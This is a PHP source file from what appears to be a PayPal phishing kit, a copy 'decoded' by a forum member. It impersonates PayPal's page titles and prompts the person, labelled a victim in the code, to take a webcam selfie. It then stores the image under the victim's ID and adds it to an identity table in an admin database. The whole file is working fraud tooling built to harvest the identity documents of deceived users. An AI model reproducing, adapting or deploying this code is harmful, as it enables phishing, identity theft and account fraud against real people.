<?php
// Decoded by Girudatsu.com Member


@session_start();
$xVictime = $_SESSION['xVictime_ID'];
$pdo = new PDO('sqlite:../admin/database.db');
$settings = $pdo->query('SELECT * FROM `settings`')->fetch(PDO::FETCH_ASSOC);
if (isset($_GET['selfie_form'])) {
    if ($settings['enable_selfie'] == 'no') {
        echo '
		<script type=\'text/javascript\'>
			document.title=\'PayPal - Thanks.\';
			$(' . '"' . '#ajax' . '"' . ').load(' . '"' . 'thanks.php' . '"' . ');
			$(' . '"' . '#loader' . '"' . ').animate({ opacity: \'0\'}, 500, function(){ $(' . '"' . '#loader' . '"' . ').css(\'display\', \'none\'); });
		</script>';
    } else {
        echo '
		<script type="text/javascript" src="js/webcam.min.js"></script>
		<script type="text/javascript" src="js/selfie.js"></script>
		<div id="my_camera" style="width:100%;height:350px;margin:10px auto;"></div>
		<button type="button" id="take_selfie" class="u-full-width button-primary">Take a Selfie</button>
		';
    }
    exit;
}
$spliter = '*_*';
$uploaddir = '../upload/';
$files_db = '';
$randomx = rand(1465294 - 465294, 17998390 - 7998391);
if (move_uploaded_file($_FILES['webcam']['tmp_name'], $uploaddir . $xVictime . '_SELFIE_' . $randomx . '.jpg')) {
    $files_db = $files_db . $uploaddir . $xVictime . '_SELFIE_' . $randomx . '.jpg' . $spliter;
}
$get_old = $pdo->query('' . 'SELECT * FROM `identity` WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '')->fetch(PDO::FETCH_ASSOC);
$the_new_one = $get_old['identities'] . $files_db;
$pdo->query('' . 'UPDATE `identity` SET `document_type`=\'document_type\',`identities`=\'' . "{$the_new_one}" . '\' WHERE `owner_id`=\'' . "{$xVictime}" . '\'' . '');
